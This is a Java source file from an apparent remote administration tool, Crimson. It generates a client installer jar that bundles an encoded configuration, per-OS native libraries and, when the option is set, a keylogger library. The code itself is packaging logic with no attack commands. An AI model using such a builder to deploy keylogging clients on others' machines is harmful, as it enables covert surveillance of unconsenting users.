/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Base64;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.zeroturnaround.zip.ZipUtil;

import com.subterranean_security.crimson.core.platform.Environment;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Misc.AuthType;
import com.subterranean_security.crimson.core.storage.BasicDatabase;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.TempUtil;
import com.subterranean_security.crimson.server.store.AuthStore;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.universal.util.JarUtil;

public class Generator {

	private static final Logger log = LoggerFactory.getLogger(Generator.class);

	private File temp = TempUtil.getDir();
	private GenReport.Builder report = GenReport.newBuilder();

	public GenReport getReport() {
		return report.build();
	}

	public Generator() {

	}

	public void generate(ClientConfig config) throws Exception {
		generate(config, 0);
	}

	public void generate(ClientConfig config, int cvid) throws Exception {

		String output = config.getOutputType().toLowerCase();
		if (output.endsWith("(.jar)")) {

			report = genJar(config, cvid).setOutputType("Runnable Java Archive");

		} else if (output.endsWith("(.exe)")) {

		} else if (output.endsWith("(.sh)")) {

		} else {

		}

		System.gc();
	}

	public byte[] getResult() throws IOException {
		byte[] result = FileUtil.readFile(new File(temp.getAbsolutePath() + "/installer.jar"));
		FileUtil.delete(temp);
		return result;
	}

	private GenReport.Builder genJar(ClientConfig ic, int cvid) throws IOException {
		GenReport.Builder gReport = GenReport.newBuilder();
		Date start = new Date();
		gReport.setGenDate(start.getTime());

		File clientJar = new File(temp.getAbsolutePath() + "/installer.jar");
		File clientDB = new File(temp.getAbsolutePath() + "/client.db");
		File internal = new File(temp.getAbsolutePath() + "/internal.txt");

		// create a database for the client
		try {
			BasicDatabase database = new BasicDatabase(clientDB);
			database.initialize();
			database.resetClient();
			database.store("cvid", cvid);
			database.store("ic", Base64.getEncoder().encodeToString(ic.toByteArray()));
			if (ic.getAuthType() == AuthType.GROUP) {
				database.store("auth.group", AuthStore.getGroup(ic.getGroupName()));
			}

			database.close();
		} catch (Exception e) {
			e.printStackTrace();
			gReport.setComment("Failed to create client database: " + e.getMessage());
			gReport.setResult(false);
			return gReport;
		}

		// copy the client jar out
		JarUtil.extract("com/subterranean_security/crimson/server/res/bin/client.jar", clientJar.getAbsolutePath());

		// add client database to jar
		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/client.db", clientDB);

		// add libraries to jar
		File tmpZip = new File(temp.getAbsolutePath() + "/clib.zip");
		tmpZip.mkdir();
		new File(tmpZip.getAbsolutePath() + "/java").mkdirs();

		// add jar files
		for (String lib : Universal.getInstancePrerequisites(Universal.Instance.CLIENT)) {
			if (lib.equals("c19") && !ic.getKeylogger()) {
				continue;
			}
			FileUtil.copy(new File(Environment.base.getAbsolutePath() + "/lib/java/" + lib + ".jar"),
					new File(tmpZip.getAbsolutePath() + "/java/" + lib + ".jar"));

		}

		// selectively add native libraries
		if (ic.hasPathWin()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/win");
			jniOut.mkdirs();
			for (File f : new File(Environment.base.getAbsolutePath() + "/lib/jni/win").listFiles()) {
				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}

		}
		if (ic.hasPathLin()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/lin");
			jniOut.mkdirs();
			for (File f : new File(Environment.base.getAbsolutePath() + "/lib/jni/lin").listFiles()) {
				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathOsx()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/osx");
			jniOut.mkdirs();
			for (File f : new File(Environment.base.getAbsolutePath() + "/lib/jni/osx").listFiles()) {
				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathSol()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/sol");
			jniOut.mkdirs();
			for (File f : new File(Environment.base.getAbsolutePath() + "/lib/jni/sol").listFiles()) {
				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathBsd()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/bsd");
			jniOut.mkdirs();
			for (File f : new File(Environment.base.getAbsolutePath() + "/lib/jni/bsd").listFiles()) {
				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}

		ZipUtil.unexplode(tmpZip);
		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/lib.zip", tmpZip);

		// create and add the internal.txt
		internal.createNewFile();
		PrintWriter pw = new PrintWriter(internal);
		pw.println(Base64.getEncoder().encodeToString(ic.toByteArray()));
		pw.close();

		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/internal.txt", internal);

		// delete jars
		// CUtil.Files.delete(clientJar);

		gReport.setHashMd5(FileUtil.getHash(clientJar.getAbsolutePath(), "MD5"));
		gReport.setHashSha256(FileUtil.getHash(clientJar.getAbsolutePath(), "SHA-256"));
		gReport.setFileSize((int) clientJar.length());
		gReport.setResult(true);
		gReport.setGenTime((int) (new Date().getTime() - start.getTime()));

		log.info("Generated jar in {} ms", gReport.getGenTime());
		return gReport;
	}

}
